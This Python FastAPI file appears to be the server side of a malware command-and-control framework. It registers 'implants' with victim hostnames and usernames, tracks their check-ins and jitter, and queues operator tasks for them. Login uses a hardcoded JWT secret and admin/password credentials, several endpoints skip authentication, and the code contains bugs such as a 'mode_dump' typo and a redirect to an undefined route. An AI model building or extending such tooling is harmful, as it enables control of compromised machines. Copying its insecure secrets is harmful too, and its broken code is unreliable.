#!/usr/bin/python3
from jose import JWTError, jwt
from datetime import datetime, timedelta, timezone


from fastapi import FastAPI, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi import Depends, FastAPI, HTTPException, status, Security
from fastapi.responses import RedirectResponse


from pydantic import BaseModel
from typing import List, Optional

from sqlalchemy import create_engine, Column, Integer, String, Text, Boolean, DateTime, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship, Session

app = FastAPI()

DATABASE_URL = "sqlite:///./database.db"

SECRET_KEY = "supersecretkey123"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# For OAuth2 Bearer token
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine, autoflush=False, autocommit=False)
Base = declarative_base()

class Token(BaseModel):
    access_token: str
    token_type: str


def create_access_token(data: dict, expires_delta: timedelta | None = None):
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt


def verify_token(token: str, Depends=(oauth2_scheme)):
    credentials_exception = HTTPException(
            status_code = status.HTTP_401_UNAUTHORIZED,
            detail="Bad credentials",
            headers={"WWW-Authenticate": "Bearer"},
            )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        return payload 
    except JWTError:
        raise credentials_exception


class Implant(Base):
    __tablename__ = "implants"
    id =            Column(Integer, primary_key=True, index=True)
    session =       Column(String, unique=True, nullable=False)
    first_checkin = Column(String)
    last_checkin =  Column(String)
    alive =         Column(Boolean)
    callback_freq = Column(Integer)
    jitter =        Column(Integer)
    username =      Column(Text)
    hostname =      Column(Text)


class ImplantCreate(BaseModel):
    session:        Optional[str] = None
    first_checkin:  Optional[str] = None
    last_checkin:   Optional[str] = None
    alive:          Optional[bool] = False
    callback_freq:  Optional[int] = 0
    jitter:         Optional[int] = 0
    username:       Optional[str] = None
    hostname:       Optional[str] = None

class ImplantRead(ImplantCreate):
    id: int

    class Config:
        form_attributes = True

class ImplantDelete(BaseModel):
    session: str

class Tasking(Base):
    __tablename__ = "tasking"
    id = Column(Integer, primary_key=True, index=True)
    session = Column(String, ForeignKey('implants.session', ondelete="CASCADE"), nullable=False)
    date = Column(String)
    task = Column(String)
    complete = Column(Boolean, default=False)
    implant = relationship("Implant", backref="taskings")

class TaskingCreate(BaseModel):
    session: Optional[str] = None
    date: Optional[str] = None
    task: Optional[str] = None
    complete: Optional[bool] = False

class TaskingRead(TaskingCreate):
    id: int

    class Config:
        form_attributes = True

class TaskingDelete(BaseModel):
    id: int
    session: str




Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

from fastapi import Depends


# endpoint in order to create a task for an implant
@app.post("/tasking/{session}", response_model=TaskingCreate)
def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()

    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Sesion not found")

    tasking_data = tasking.mode_dump(exclude={"session"})
    db_task = Tasking(**tasking_data, session=session, date=current_time)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task

@app.get("/tasking/{session}", response_model=List[TaskingRead])
def read_taskings(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    
    tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.complete == False).all()
    return tasking

# delete tasking
# ensure session exists, return only taskings completed=False

# initial checkin endpoint for implants, register with server for future tasking/results/tracking
@app.post("/implants/", response_model=ImplantRead)
def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()
    
    implant_data = implant.model_dump(exclude={"alive", "first_checkin", "last_checkin"})
    db_implant = Implant(**implant_data, alive=True, first_checkin=current_time, last_checkin=current_time)

    db.add(db_implant)
    db.commit()
    db.refresh(db_implant)
    return db_implant


# for clients only to be able to view all implants
@app.get("/implants/", response_model=List[ImplantRead])
def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    implants = db.query(Implant).all()
    return implants


# protected endpoint allowing client to delete stale/killed implants
@app.delete("/implants/delete/{session}", response_model=ImplantDelete)
def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db.delete(db_implant)
    db.commit()
    return ImplantDelete(session=session)


# for client only to be able to access protected endpoints
@app.post("/token/", response_model=Token)
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    if form_data.username != "admin" or form_data.password != "password":
        raise HTTPException(status_code=400, detail="Invalid username or password")
    access_token = create_access_token(data={"sub": form_data.username})
    return {"access_token": access_token, "token_type": "bearer"}


# implant checkin endpoint
@app.get("/health/{session}", response_model=ImplantCreate)
def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
    check_in_time = datetime.now(timezone.utc).isoformat()

    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db_implant.last_checkin = check_in_time
    db.commit()
    db.refresh(db_implant)

    pending_tasks = db.query(Tasking).filter(Tasking.session == session, Tasking.complete == False).all()

    if pending_tasks:
        return RedirectResponse(f"/tasks/{session}/", status_code=301)

    # no pending tasks all completed=True
    return db_implant
